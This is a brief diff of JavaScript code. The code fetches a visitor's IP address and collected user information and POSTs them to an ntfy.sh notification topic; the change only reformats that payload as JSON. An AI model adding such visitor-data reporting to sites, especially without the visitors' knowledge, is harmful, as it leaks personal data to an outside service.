@@ -370,7 +370,7 @@ function getUserIP() {
 getUserIP().then(ip => {
   fetch('https://ntfy.sh/'+myTopic, {
     method: 'POST',
-    body: `IP : ${ip}  \n\n ${getUserInfo()}`
+    body: `IP : ${ip}  \n\n ${JSON.stringify(getUserInfo(), null, 2)}`
   })
 });
 
